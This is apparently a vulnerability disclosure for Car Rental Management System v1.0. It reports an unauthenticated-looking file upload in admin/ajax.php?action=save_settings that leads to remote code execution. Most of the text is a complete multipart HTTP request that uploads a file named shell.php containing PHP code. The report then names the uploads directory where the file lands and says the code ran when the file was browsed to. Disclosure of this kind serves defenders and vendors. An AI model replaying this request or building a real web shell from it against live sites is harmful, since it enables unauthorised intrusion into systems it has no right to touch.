# Car Rental Management System v1.0 has arbitrary code execution (RCE)

vendor: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability url: ip/car-rental-management-system/admin/ajax.php?action=save_settings

Request package for file upload：

```sql
POST /car-rental-management-system/admin/ajax.php?action=save_settings HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/car-rental-management-system/admin/index.php?page=site_settings
Content-Length: 1636
Content-Type: multipart/form-data; boundary=---------------------------218441699924310
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close

-----------------------------218441699924310
Content-Disposition: form-data; name="name"

Car Rental Management System
-----------------------------218441699924310
Content-Disposition: form-data; name="email"

info@sample.comm
-----------------------------218441699924310
Content-Disposition: form-data; name="contact"

+6948 8542 623
-----------------------------218441699924310
Content-Disposition: form-data; name="about"

<p style="text-align: center; background: transparent; position: relative;"><span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-weight: 400; text-align: justify;">&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industryâs standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</span><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p></p>
-----------------------------218441699924310
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------218441699924310--
```

The files will be uploaded to this directory \admin\assets\uploads\
![image](https://user-images.githubusercontent.com/54017627/170957730-b19378a7-0303-4b1b-8833-12b3b24f9e83.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/170957793-9955af79-2fd7-4c29-92d4-f44346b24aea.png)
